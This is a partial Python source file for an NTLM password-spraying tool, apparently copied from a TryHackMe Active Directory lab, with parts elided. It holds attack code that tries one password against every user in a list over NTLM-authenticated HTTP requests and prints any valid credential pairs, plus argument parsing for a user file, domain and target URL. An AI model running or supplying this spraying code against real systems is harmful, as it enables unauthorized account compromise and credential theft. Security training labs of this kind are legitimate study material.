...
# 出展
# https://tryhackme.com/r/room/breachingad そのまま
...
class NTLMSprayer:
    ...
    def password_spray(self, password, url):
        print(
            "[*] Starting passwords spray attack using the following password: "
            + password
        )
        count = 0
        for user in self.users:
            response = requests.get(
                url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password)
            )
            if response.status_code == self.HTTP_AUTH_SUCCEED_CODE:
                print(
                    "[+] Valid credential pair found! Username: "
                    + user
                    + " Password: "
                    + password
                )
        ...
        print(
            "[*] Password spray attack completed, "
            + str(count)
...
def main(argv):
    ...
    try:
        opts, args = getopt.getopt(
            argv,
            "hu:f:p:a:",
            ["userfile=", "fqdn=", "password=", "attackurl="],
        )
